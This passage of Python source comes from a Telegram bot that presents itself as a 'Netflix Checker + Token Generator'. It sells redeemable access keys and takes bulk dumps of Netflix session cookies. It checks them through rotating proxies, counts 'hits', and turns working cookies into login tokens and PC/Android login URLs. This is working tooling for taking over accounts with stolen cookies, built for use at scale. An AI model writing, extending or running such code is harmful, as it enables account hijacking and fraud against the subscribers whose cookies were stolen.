        await update.message.reply_text("<b>Usage:</b> /lock all", parse_mode=ParseMode.HTML)
        return
    bot_locked = True
    save_lock_state()
    await update.message.reply_text(
        "\U0001f512 <b>Bot locked successfully.</b>\n"
        "Only authorized users can now use bot commands.\n"
        "Use /unlock all to restore free access.",
        parse_mode=ParseMode.HTML
    )


async def unlock_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bot_locked
    user = update.effective_user
    if str(user.id) != OWNER_USER_ID:
        await update.message.reply_text("\u274c This command is only available for the bot owner.", parse_mode=ParseMode.HTML)
        return
    args = context.args or []
    if not args or args[0].lower() != "all":
        await update.message.reply_text("<b>Usage:</b> /unlock all", parse_mode=ParseMode.HTML)
        return
    bot_locked = False
    save_lock_state()
    await update.message.reply_text(
        "\U0001f513 <b>Bot unlocked successfully.</b>\n"
        "All users can now use bot commands freely.",
        parse_mode=ParseMode.HTML
    )


async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if str(user.id) != OWNER_USER_ID:
        await update.message.reply_text("\u274c This command is only available for the bot owner.", parse_mode=ParseMode.HTML)
        return
    args = context.args or []
    if not args:
        durations = ", ".join(DURATION_MAP.keys())
        await update.message.reply_text(
            f"<b>Usage:</b> /genkey &lt;duration&gt; [count]\n\n"
            f"<b>Durations:</b> {durations}\n\n"
            f"<b>Examples:</b>\n"
            f"/genkey 1d - Generate 1 key for 1 day\n"
            f"/genkey 1m 5 - Generate 5 keys for 1 month",
            parse_mode=ParseMode.HTML
        )
        return
    dur_code = args[0].lower()
    if dur_code not in DURATION_MAP:
        durations = ", ".join(DURATION_MAP.keys())
        await update.message.reply_text(f"\u274c Invalid duration. Available: {durations}", parse_mode=ParseMode.HTML)
        return
    count = 1
    if len(args) > 1:
        try:
            count = min(int(args[1]), 50)
            if count < 1:
                count = 1
        except ValueError:
            count = 1
    keys_list = []
    for _ in range(count):
        key = generate_key()
        generated_keys[key] = {
            "duration": dur_code, "seconds": DURATION_MAP[dur_code],
            "created_by": str(user.id), "created_at": time.time(),
            "redeemed": False, "redeemed_by": None
        }
        keys_list.append(key)
    save_keys(generated_keys)
    keys_text = "\n".join([f"<code>{k}</code>" for k in keys_list])
    await update.message.reply_text(
        f"<b>\U0001f511 Generated {count} Key(s)</b>\n\n"
        f"Duration: <b>{duration_label(dur_code)}</b>\n\n"
        f"{keys_text}\n\n"
        f"Users can redeem with: /redeem &lt;key&gt;",
        parse_mode=ParseMode.HTML
    )


async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = str(user.id)
    args = context.args or []
    if not args:
        await update.message.reply_text("<b>Usage:</b> /redeem &lt;key&gt;\n\nExample: /redeem NFLX-ABCD-1234-EFGH-5678", parse_mode=ParseMode.HTML)
        return
    key = args[0].upper()
    if key not in generated_keys:
        await update.message.reply_text("\u274c Invalid key. Please check and try again.", parse_mode=ParseMode.HTML)
        return
    key_info = generated_keys[key]
    if key_info.get("redeemed"):
        await update.message.reply_text("\u274c This key has already been redeemed.", parse_mode=ParseMode.HTML)
        return
    duration_secs = key_info["seconds"]
    dur_code = key_info["duration"]
    expires_at = time.time() + duration_secs
    if uid in user_access:
        existing_exp = user_access[uid].get("expires", 0)
        if existing_exp > time.time():
            expires_at = existing_exp + duration_secs
    user_access[uid] = {
        "expires": expires_at, "key_used": key, "redeemed_at": time.time()
    }
    save_user_access()
    generated_keys[key]["redeemed"] = True
    generated_keys[key]["redeemed_by"] = uid
    generated_keys[key]["redeemed_username"] = f"@{user.username}" if user.username else f"{user.first_name}"
    generated_keys[key]["redeemed_at"] = time.time()
    save_keys(generated_keys)
    try:
        user_info = f"@{user.username}" if user.username else f"<code>{uid}</code>"
        await context.bot.send_message(
            int(OWNER_USER_ID),
            f"<b>\U0001f511 Key Redeemed</b>\n\n"
            f"User: {user_info}\n"
            f"ID: <code>{uid}</code>\n"
            f"Key: <code>{key}</code>\n"
            f"Duration: <b>{duration_label(dur_code)}</b>",
            parse_mode=ParseMode.HTML
        )
    except:
        pass
    exp_date = datetime.fromtimestamp(expires_at).strftime("%Y-%m-%d %H:%M:%S")
    await update.message.reply_text(
        f"\u2705 <b>Key Redeemed Successfully!</b>\n\n"
        f"Duration: <b>{duration_label(dur_code)}</b>\n"
        f"Expires: <b>{exp_date}</b>\n"
        f"Access: {get_access_info(uid)}\n\n"
        f"Send /start to begin using the bot.",
        parse_mode=ParseMode.HTML
    )


async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.message.from_user.id) != OWNER_USER_ID:
        await update.message.reply_text("\u274c Owner only command.", parse_mode=ParseMode.HTML)
        return
    raw_text = update.message.text or ""
    parts = raw_text.split(None, 1)
    proxy_text = parts[1].strip() if len(parts) > 1 else ""
    if not proxy_text:
        count = len(proxy_list)
        status = f"{count} proxies loaded (rotating)" if count > 0 else "No proxies set"
        await update.message.reply_text(
            f"<b>\U0001f310 Proxy Settings</b>\n\n"
            f"Current: <code>{status}</code>\n\n"
            f"<b>Usage:</b>\n"
            f"/addproxy host:port:user:pass\n"
            f"/addproxy proxy1\nproxy2\nproxy3\n\n"
            f"<b>Example:</b>\n"
            f"/addproxy px013301.server.com:10780:user:pass\n"
            f"px013302.server.com:10780:user:pass\n\n"
            f"Also supports:\n"
            f"\u2022 host:port (no auth)\n"
            f"\u2022 http://user:pass@host:port\n"
            f"\u2022 socks5://user:pass@host:port\n\n"
            f"Multiple proxies will rotate automatically.\n"
            f"Use /removeproxy all to clear all proxies.\n"
            f"Use /proxylist to see loaded proxies.",
            parse_mode=ParseMode.HTML
        )
        return
    lines = [l.strip() for l in proxy_text.splitlines() if l.strip()]
    total = len(lines)
    added = []
    failed = []
    for i, line in enumerate(lines):
        proxy_url = parse_proxy_string(line)
        if not proxy_url:
            failed.append(f"{line} (invalid format)")
            continue
        if proxy_url in proxy_list:
            failed.append(f"{line} (duplicate)")
            continue
        proxy_list.append(proxy_url)
        added.append(line)
    save_proxy()
    global checker, token_gen
    checker = NetflixChecker()
    token_gen = NetflixTokenGenerator()
    msg = f"\u2705 <b>Proxies Added</b>\n\n"
    msg += f"\U0001f7e2 Added: {len(added)}\n"
    if failed:
        msg += f"\u26a0\ufe0f Skipped: {len(failed)}\n"
    msg += f"\U0001f4e6 Total proxies: {len(proxy_list)}\n"
    msg += f"\U0001f504 Rotation: Enabled\n"
    if failed:
        msg += f"\n<b>Skipped:</b>\n"
        for f in failed[:5]:
            msg += f"\u2022 <code>{f}</code>\n"
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)


async def removeproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.message.from_user.id) != OWNER_USER_ID:
        await update.message.reply_text("\u274c Owner only command.", parse_mode=ParseMode.HTML)
        return
    args = context.args or []
    if args and args[0].lower() == "all":
        count = len(proxy_list)
        proxy_list.clear()
        proxy_index["idx"] = 0
        save_proxy()
        global checker, token_gen
        checker = NetflixChecker()
        token_gen = NetflixTokenGenerator()
        await update.message.reply_text(f"\u2705 All {count} proxies removed. Using direct connection now.", parse_mode=ParseMode.HTML)
        return
    if args:
        try:
            idx = int(args[0]) - 1
            if 0 <= idx < len(proxy_list):
                removed = proxy_list.pop(idx)
                save_proxy()
                checker = NetflixChecker()
                token_gen = NetflixTokenGenerator()
                await update.message.reply_text(
                    f"\u2705 Removed proxy #{idx+1}\n<code>{removed}</code>\n\n"
                    f"\U0001f4e6 Remaining: {len(proxy_list)} proxies",
                    parse_mode=ParseMode.HTML
                )
                return
            else:
                await update.message.reply_text(f"\u274c Invalid index. Use /proxylist to see proxy numbers.", parse_mode=ParseMode.HTML)
                return
        except ValueError:
            pass
    proxy_list.clear()
    proxy_index["idx"] = 0
    save_proxy()
    checker = NetflixChecker()
    token_gen = NetflixTokenGenerator()
    await update.message.reply_text("\u2705 All proxies removed. Using direct connection now.", parse_mode=ParseMode.HTML)


async def proxylist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.message.from_user.id) != OWNER_USER_ID:
        await update.message.reply_text("\u274c Owner only command.", parse_mode=ParseMode.HTML)
        return
    if not proxy_list:
        await update.message.reply_text("\u274c No proxies loaded. Use /addproxy to add.", parse_mode=ParseMode.HTML)
        return
    msg = f"<b>\U0001f310 Proxy List ({len(proxy_list)} total)</b>\n\n"
    for i, p in enumerate(proxy_list):
        host_part = p.split('@')[-1] if '@' in p else p.replace('http://', '')
        msg += f"{i+1}. <code>{host_part}</code>\n"
    msg += f"\n\U0001f504 Rotation: Enabled\n"
    msg += f"Use /removeproxy [number] to remove one\n"
    msg += f"Use /removeproxy all to clear all"
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)


async def proxytest_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.message.from_user.id) != OWNER_USER_ID:
        await update.message.reply_text("\u274c Owner only command.", parse_mode=ParseMode.HTML)
        return
    if not proxy_list:
        await update.message.reply_text("\u274c No proxies configured. Use /addproxy first.", parse_mode=ParseMode.HTML)
        return
    proxy_url = get_rotating_proxy()
    msg = await update.message.reply_text(f"\u23f3 Testing proxy ({proxy_list.index(proxy_url)+1}/{len(proxy_list)})...", parse_mode=ParseMode.HTML)
    try:
        test_session = requests.Session()
        test_session.proxies.update({"http": proxy_url, "https": proxy_url})
        resp = test_session.get("https://www.netflix.com", timeout=15, allow_redirects=True,
                                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0"})
        ip_resp = test_session.get("https://api.ipify.org?format=json", timeout=10)
        ip_info = ip_resp.json()
        host_part = proxy_url.split('@')[-1] if '@' in proxy_url else proxy_url.replace('http://', '')
        await msg.edit_text(
            f"\u2705 <b>Proxy Test Passed</b>\n\n"
            f"\U0001f310 Proxy: <code>{host_part}</code>\n"
            f"\U0001f4cd IP: <code>{ip_info.get('ip', 'Unknown')}</code>\n"
            f"\U0001f4e1 Netflix Status: HTTP {resp.status_code}\n"
            f"\U0001f517 Final URL: {resp.url[:80]}\n\n"
            f"\U0001f4e6 Total proxies: {len(proxy_list)} (rotating)",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        host_part = proxy_url.split('@')[-1] if '@' in proxy_url else proxy_url.replace('http://', '')
        await msg.edit_text(
            f"\u274c <b>Proxy Test Failed</b>\n\n"
            f"\U0001f310 Proxy: <code>{host_part}</code>\n"
            f"\u26a0\ufe0f Error: {str(e)[:200]}",
            parse_mode=ParseMode.HTML
        )


async def workers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global WORKER_COUNT
    args = context.args or []
    if not args:
        await update.message.reply_text(f"Current workers: {WORKER_COUNT}\nMax workers: {MAX_WORKERS}\n\nUsage: /workers <number>", parse_mode=ParseMode.HTML)
        return
    try:
        new_w = int(args[0])
        if 1 <= new_w <= MAX_WORKERS:
            WORKER_COUNT = new_w
            await update.message.reply_text(f"\u2705 Workers set to {WORKER_COUNT}", parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(f"\u274c Please enter a number between 1 and {MAX_WORKERS}", parse_mode=ParseMode.HTML)
    except ValueError:
        await update.message.reply_text("\u274c Please enter a valid number", parse_mode=ParseMode.HTML)


async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = token_gen.get_stats()
    last_gen = stats["last_generated"]
    if last_gen:
        time_since = token_gen.humanize_time(datetime.now() - last_gen)
        last_gen_str = f"{last_gen.strftime('%Y-%m-%d %H:%M:%S')} ({time_since} ago)"
    else:
        last_gen_str = "Never"
    active_batches = len([t for t in batch_tasks.values() if t.get("active")])
    msg = (
        "<b>\U0001f4ca Bot Statistics</b>\n\n"
        f"\U0001f451 <b>Owner:</b> @XD_HR\n\n"
        f"\U0001f916 Bot Status: Active \u2705\n"
        f"\U0001f465 Authorized Users: {len(authorized_users)}\n"
        f"\U0001f50d Cookies Checked: {stats['checks_done']}\n"
        f"\u2705 Hits: {stats['hits']}\n"
        f"\U0001f511 Tokens Generated: {stats['tokens_generated']}\n"
        f"\u274c Errors: {stats['errors']}\n"
        f"\U0001f504 Active Batches: {active_batches}\n"
        f"\U0001f4c1 Total Batches: {stats['batch_processes']}\n"
        f"\U0001f6d1 Batches Stopped: {stats['batch_stopped']}\n"
        f"\u274c Batches Cancelled: {stats['batch_cancelled']}\n"
        f"\U0001f477 Current Workers: {WORKER_COUNT}\n"
        f"\u26a1 Max Workers: {MAX_WORKERS}\n"
        f"\u23f0 Last Generated: {last_gen_str}\n\n"
        f"\U0001f6e0 Version: 5.0 (HTTP Bot API)\n"
        f"\U0001f3ac Service: Netflix Checker + Token Generator"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)


def _has_active_batch(user_id):
    for tid, task in batch_tasks.items():
        if task.get("user_id") == user_id and task.get("active"):
            return True
    return False


async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in stop_flags or _has_active_batch(user_id):
        stop_flags[user_id] = {"action": "stop", "save": True}
        await update.message.reply_text("\U0001f6d1 Stop signal sent. Batch will stop after current cookies...", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text("\u274c No active batch process found.", parse_mode=ParseMode.HTML)


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in stop_flags or _has_active_batch(user_id):
        stop_flags[user_id] = {"action": "cancel", "save": False}
        await update.message.reply_text("\U0001f6d1 Cancel signal sent. Batch will stop without saving...", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text("\u274c No active batch process found.", parse_mode=ParseMode.HTML)


async def stop_batch_owner(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != OWNER_USER_ID:
        return
    args = context.args or []
    if not args:
        active = []
        for tid, task in batch_tasks.items():
            if task.get("active"):
                active.append(f"ID: <code>{tid}</code>\nUser: {task.get('username')}\nFile: {task.get('file_name')}")
        if not active:
            await update.message.reply_text("No active batches.", parse_mode=ParseMode.HTML)
            return
        await update.message.reply_text("<b>Active Batches:</b>\n\n" + "\n\n".join(active) + "\n\nUsage: /stop_batch &lt;id&gt;", parse_mode=ParseMode.HTML)
        return
    tid = args[0]
    if tid in batch_tasks:
        user_id = int(tid.split('_')[0])
        if user_id not in stop_flags:
            stop_flags[user_id] = {"action": "stop", "save": True}
        await update.message.reply_text(f"\u2705 Stopping batch {tid}", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text("\u274c Batch ID not found.", parse_mode=ParseMode.HTML)


async def preview_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != OWNER_USER_ID:
        return
    active_batches = []
    for tid, task in batch_tasks.items():
        if task.get("active"):
            processed = task.get("processed", 0)
            total = task.get("total", 0)
            hits = task.get("hits", 0)
            failed = task.get("failed", 0)
            username = task.get("username", "Unknown")
            filename = task.get("file_name", "Unknown")
            size = task.get("file_size", 0)
            size_str = human_size(size) if size > 0 else "Unknown"
            progress = (processed / total * 100) if total > 0 else 0
            active_batches.append(
                f"\U0001f464 <b>User:</b> {username}\n"
                f"\U0001f4c4 <b>File:</b> <code>{filename}</code> (Size: <code>{size_str}</code>)\n"
                f"\U0001f4ca <b>Progress:</b> {processed}/{total} ({progress:.1f}%)\n"
                f"\u2705 <b>Hits:</b> {hits} | \u274c <b>Failed:</b> {failed}\n"
                f"\U0001f194 <b>ID:</b> <code>{tid}</code>"
            )
    if not active_batches:
        await update.message.reply_text("\U0001f4ed No active batch processes at the moment.", parse_mode=ParseMode.HTML)
        return
    summary = "<b>\U0001f680 Active Batch Processes</b>\n\n" + "\n\n".join(active_batches)
    await update.message.reply_text(summary, parse_mode=ParseMode.HTML)


async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    if not check_lock(message.from_user.id):
        await message.reply_text(LOCK_MSG, parse_mode=ParseMode.HTML)
        return
    cookie_text = None
    source_label = "direct_input"

    if message.reply_to_message:
        replied = message.reply_to_message
        if replied.document:
            try:
                tg_file = await context.bot.get_file(replied.document.file_id)
                file_bytes = await tg_file.download_as_bytearray()
                cookie_text = bytes(file_bytes).decode('utf-8')
                source_label = replied.document.file_name or "uploaded_file"
            except Exception as e:
                await message.reply_text(f"\u274c Error downloading file: {e}", parse_mode=ParseMode.HTML)
                return
        else:
            cookie_text = replied.text or replied.caption
    else:
        args_text = message.text.partition(' ')[2].strip() if ' ' in message.text else ''
        if args_text:
            cookie_text = args_text
        elif message.from_user.id in user_file_store:
            fpath = user_file_store[message.from_user.id]
            try:
                with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                    cookie_text = f.read()
                source_label = os.path.basename(fpath)
            except:
                pass

    if not cookie_text:
        await message.reply_text(
            "Usage:\n"
            "\u2022 /chk &lt;cookie_string&gt;\n"
            "\u2022 Reply to a cookie message/file with /chk\n"
            "\u2022 Upload a .txt file then reply with /chk",
            parse_mode=ParseMode.HTML
        )
        return

    lines = [l.strip() for l in cookie_text.strip().splitlines() if l.strip()]
    has_netflix_cookie = any(
        ('NetflixId=' in l or 'netflixid=' in l.lower() or
         'v%3D3%26ct%3D' in l or 'v=3&ct=' in l)
        and '\t' not in l
        for l in lines
    )

    if not has_netflix_cookie:
        parsed = parse_cookie_file_content(cookie_text)
        if parsed:
            lines = [parsed]
        else:
            await message.reply_text("\u274c No valid Netflix cookies found in this file.", parse_mode=ParseMode.HTML)
            return

    if len(lines) == 1:
        processing_msg = await message.reply_text("\U0001f50e Checking cookie & generating token...", parse_mode=ParseMode.HTML)
        loop = asyncio.get_event_loop()
        result, err = await loop.run_in_executor(thread_pool, check_and_generate, lines[0], source_label, True)
        if result:
            await processing_msg.edit_text(result, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
        else:
            await processing_msg.edit_text(f"\u274c Failed: {err}", parse_mode=ParseMode.HTML)
    else:
        asyncio.get_event_loop().create_task(
            process_batch_check_async(context.bot, message, lines, source_label)
        )


async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    if not check_lock(message.from_user.id):
        await message.reply_text(LOCK_MSG, parse_mode=ParseMode.HTML)
        return
    cookie_text = None
    if message.reply_to_message:
        cookie_text = message.reply_to_message.text or message.reply_to_message.caption
    else:
        args_text = message.text.partition(' ')[2].strip() if ' ' in message.text else ''
        if args_text:
            cookie_text = args_text

    if not cookie_text:
        await message.reply_text("Send a Netflix cookie or reply to a cookie message with /gen", parse_mode=ParseMode.HTML)
        return

    processing_msg = await message.reply_text("\u23f3 Processing cookie...", parse_mode=ParseMode.HTML)
    netflix_id = token_gen.extract_netflix_id(cookie_text)
    if not netflix_id:
        await processing_msg.edit_text("\u274c Could not find NetflixId in the provided text.", parse_mode=ParseMode.HTML)
        return

    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(thread_pool, token_gen.generate_token_sync, cookie_text)
    if not result["success"]:
        await processing_msg.edit_text(f"\u274c Token Generation Failed\n\nError: {result.get('error', 'Unknown')}", parse_mode=ParseMode.HTML)
        return

    clean_token = result['token'][:100] + "..." if len(result['token']) > 100 else result['token']
    pc_url = result.get('pc_login_url', result.get('login_url', 'N/A'))
    android_url = result.get('android_login_url', pc_url)
    msg = (
        f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
        f"  \U0001f511 TOKEN GENERATED\n"
        f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n"
        f"\U0001f511 Token:\n{clean_token}\n\n"
        f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
        f"  \U0001f517 LOGIN URLS\n"
        f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n"
        f"\U0001f4bb PC: {pc_url}\n\n"
        f"\U0001f4f1 Android: {android_url}\n"
        f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
        f"\U0001f451 @XD_HR"
    )

    user_id = message.from_user.id
    token_key = f"{user_id}_{datetime.now().timestamp()}"
    user_tokens[token_key] = {"token": result['token'], "pc_login_url": pc_url, "android_login_url": android_url}

    markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("\U0001f4cb Get Full Token", callback_data=f"get_token_{token_key}")],
        [
            InlineKeyboardButton("\U0001f4bb PC Login", url=pc_url),
            InlineKeyboardButton("\U0001f4f1 Android Login", url=android_url),
        ],
        [InlineKeyboardButton("\U0001f4c1 Save to File", callback_data=f"save_token_{token_key}")]
    ])
    await processing_msg.edit_text(msg, reply_markup=markup, parse_mode=ParseMode.HTML)


async def extract_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    if not check_lock(message.from_user.id):
        await message.reply_text(LOCK_MSG, parse_mode=ParseMode.HTML)
        return
    raw_text = None
    args_text = message.text.partition(' ')[2].strip() if ' ' in message.text else ''
    if args_text:
        raw_text = args_text
    elif message.reply_to_message:
        replied = message.reply_to_message
        if replied.document:
            try:
                tg_file = await context.bot.get_file(replied.document.file_id)
                file_bytes = await tg_file.download_as_bytearray()
                raw_text = bytes(file_bytes).decode('utf-8')
            except Exception as e:
                await message.reply_text(f"\u274c Error downloading file: {e}", parse_mode=ParseMode.HTML)
                return
        else:
            raw_text = replied.text or replied.caption
    elif message.from_user.id in user_file_store:
        fpath = user_file_store[message.from_user.id]
        try:
            with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                raw_text = f.read()
        except:
            pass

    if not raw_text:
        await message.reply_text("Usage:\n/extract <paste cookie dump>\nOR reply to a .txt file with /extract", parse_mode=ParseMode.HTML)
        return

    filtered = get_filtered_netflix_ids(raw_text)
    if not filtered:
        await message.reply_text("\u274c No NetflixId found in the provided text.", parse_mode=ParseMode.HTML)
        return

    out_name = os.path.join(RESULTS_DIR, "Extracted_Cookies.txt")
    with open(out_name, 'w', encoding='utf-8') as fo:
        for line in filtered:
            fo.write(line + "\n")

    preview_lines = filtered[:5]
    preview_parts = []
    for pl in preview_lines:
        if len(pl) > 80:
            preview_parts.append(pl[:80] + "...")
        else:
            preview_parts.append(pl)
    preview = "\n".join(preview_parts)
    summary = f"\u2705 Extracted {len(filtered)} NetflixId(s).\n\nPreview (first {min(5, len(filtered))}):\n{preview}"
    if len(summary) > 4000:
        summary = summary[:4000] + "\n..."
    try:
        await message.reply_text(summary, parse_mode=ParseMode.HTML)
    except Exception:
        await message.reply_text(f"\u2705 Extracted {len(filtered)} NetflixId(s). Sending as file...", parse_mode=ParseMode.HTML)
    try:
        await context.bot.send_document(message.chat_id, document=open(out_name, 'rb'), reply_to_message_id=message.message_id)
    finally:
        cleanup_file(out_name)


async def batch_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    user_id = message.from_user.id
    if not check_lock(user_id):
        await message.reply_text(LOCK_MSG, parse_mode=ParseMode.HTML)
        return
    if not can_use_batch(user_id):
        await message.reply_text(
            f"\u274c You've reached your daily batch limit ({FREE_DAILY_BATCH_LIMIT}/day).\n"
            f"Free users can use /batch {FREE_DAILY_BATCH_LIMIT} times per day.\n"
            f"You can still use /chk unlimited times.\n\n"
            f"Use /redeem &lt;key&gt; to get premium access for unlimited batches.",
            parse_mode=ParseMode.HTML
        )
        return

    if not message.reply_to_message:
        await message.reply_text("Please reply to a text file or message containing cookies with /batch", parse_mode=ParseMode.HTML)
        return

    replied = message.reply_to_message
    if replied.document:
        try:
            tg_file = await context.bot.get_file(replied.document.file_id)
            file_bytes = await tg_file.download_as_bytearray()
            file_size = len(file_bytes)
            text_content = bytes(file_bytes).decode('utf-8')
            source_name = replied.document.file_name or "batch_file"
        except Exception as e:
            await message.reply_text(f"\u274c Error downloading file: {e}", parse_mode=ParseMode.HTML)
            return
    else:
        text_content = replied.text or replied.caption
        source_name = "batch_text"
        file_size = len(text_content.encode('utf-8', errors='replace')) if text_content else 0
        if not text_content:
            await message.reply_text("No text found in the replied message.", parse_mode=ParseMode.HTML)
            return

    lines = [l.strip() for l in text_content.strip().splitlines() if l.strip()]
    cookies = []
    for line in lines:
        if ('NetflixId=' in line or 'netflixid=' in line.lower() or
                'v%3D3%26ct%3D' in line or 'v=3&ct=' in line or 'SecureNetflixId' in line):
            cookies.append(line)

    if not cookies:
        parsed = parse_cookie_file_content(text_content)
        if parsed:
            cookies = [parsed]

    if not cookies:
        await message.reply_text("\u274c No valid Netflix cookies found.", parse_mode=ParseMode.HTML)
        return

    increment_batch_usage(message.from_user.id)
    asyncio.get_event_loop().create_task(
        process_batch_check_async(context.bot, message, cookies, source_name, file_size)
    )


async def process_batch_check_async(bot, message, cookies, source_name, file_size=0):
    user_id = message.from_user.id
    total = len(cookies)
    stop_flags[user_id] = {"action": None, "save": True}
    task_id = f"{user_id}_{int(datetime.now().timestamp())}"
    batch_tasks[task_id] = {
        "user_id": user_id, "total": total, "processed": 0,
        "hits": 0, "failed": 0, "errors": 0, "results": [], "started_at": datetime.now(), "active": True,
        "file_name": source_name, "file_size": file_size,
        "username": f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
    }
    token_gen.stats["batch_processes"] += 1
    start_msg = (
        "<b>\u26a1 Batch Processing Started</b>\n\n"
        f"\u2705 Found: {total} cookies\n"
        f"\U0001f477 Workers: {WORKER_COUNT}\n"
        f"\u23f3 Starting...\n\n"
        f"/stop - Stop and save | /cancel - Stop without saving"
    )
    progress_msg = await message.reply_text(start_msg, parse_mode=ParseMode.HTML)

    try:
        username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
        owner_notify = (
            "<b>\U0001f4cb Batch Process Started</b>\n\n"
            f"\U0001f464 User: {username} (ID: {user_id})\n"
            f"\U0001f4c1 File: {source_name}\n"
            f"\U0001f4e6 Size: {human_size(file_size) if file_size > 0 else 'N/A'}\n"
            f"\U0001f36a Cookies: {total}\n"
            f"\U0001f477 Workers: {WORKER_COUNT}\n"
            f"\u23f0 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        await bot.send_message(int(OWNER_USER_ID), owner_notify, parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.debug(f"Failed to notify owner: {e}")

    all_results = []
    results_lock = asyncio.Lock()
    last_update = {"time": time.time(), "count": 0}

    def process_single(args):
        i, cookie_line = args
        if stop_flags.get(user_id, {}).get("action") in ["stop", "cancel"]:
            return None
        time.sleep(0.5)
        label = f"{source_name}_cookie_{i + 1}"
        result, err = check_and_generate(cookie_line, label)
        return (i, result, err)

    async def update_progress(force=False):
        processed = batch_tasks[task_id].get("processed", 0)
        now = time.time()
        if not force and (processed == last_update["count"] or (now - last_update["time"]) < 3):
            return
        last_update["time"], last_update["count"] = now, processed
        hits, failed = batch_tasks[task_id]["hits"], batch_tasks[task_id]["failed"]
        errors = batch_tasks[task_id].get("errors", 0)
        rate = (hits / processed * 100) if processed > 0 else 0
        elapsed = now - batch_tasks[task_id]["started_at"].timestamp()
        speed = processed / elapsed if elapsed > 0 else 0
        eta = int((total - processed) / speed) if speed > 0 else 0
        eta_str = f"{eta // 60}m {eta % 60}s" if eta >= 60 else f"{eta}s"
        icon = "\u2705" if force else "\u23f3"
        error_line = f"\n\u26a0\ufe0f Errors: {errors}" if errors > 0 else ""
        try:
            await progress_msg.edit_text(
                f"<b>{icon} Batch Processing</b>\n\n"
                f"\U0001f4ca Progress: {processed}/{total}\n"
                f"\u2705 Hits: {hits}\n"
                f"\u274c Failed: {failed}{error_line}\n"
                f"\U0001f4c8 Hit Rate: {rate:.1f}%\n"
                f"\U0001f477 Workers: {WORKER_COUNT}\n"
                f"\u23f1 Speed: {speed:.1f}/s | ETA: {eta_str}\n\n"
                f"<i>Last Update: {datetime.now().strftime('%H:%M:%S')}</i>\n"
                f"/stop - Stop and save | /cancel - Stop without saving",
                parse_mode=ParseMode.HTML
            )
        except:
            pass

    async def watchdog():
        while batch_tasks.get(task_id, {}).get("active"):
            await asyncio.sleep(10)
            await update_progress()

    watchdog_task = asyncio.create_task(watchdog())

    loop = asyncio.get_event_loop()
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=WORKER_COUNT) as executor:
            futures = [loop.run_in_executor(executor, process_single, (i, c)) for i, c in enumerate(cookies)]
            for coro in asyncio.as_completed(futures):
                result_tuple = await coro
                if result_tuple:
                    i, result, err = result_tuple
                    async with results_lock:
                        batch_tasks[task_id]["processed"] += 1
                        if result:
                            batch_tasks[task_id]["hits"] += 1
                            all_results.append(result)
                        elif err and ('Timeout' in str(err) or 'Network' in str(err) or 'Error:' in str(err) or 'HTTP 5' in str(err) or 'HTTP 429' in str(err) or 'Connection' in str(err)):
                            batch_tasks[task_id]["errors"] += 1
                            batch_tasks[task_id]["failed"] += 1
                        else:
                            batch_tasks[task_id]["failed"] += 1
                else:
                    async with results_lock:
                        batch_tasks[task_id]["processed"] += 1
                        batch_tasks[task_id]["failed"] += 1

                await update_progress()
                if stop_flags.get(user_id, {}).get("action") in ["stop", "cancel"]:
                    break

        await update_progress(force=True)
        stop_info = stop_flags.get(user_id, {})
        action, save = stop_info.get("action"), stop_info.get("save", True)
        if action == "stop":
            token_gen.stats["batch_stopped"] += 1
            await progress_msg.edit_text("\U0001f6d1 <b>Batch Stopped</b>", parse_mode=ParseMode.HTML)
        elif action == "cancel":
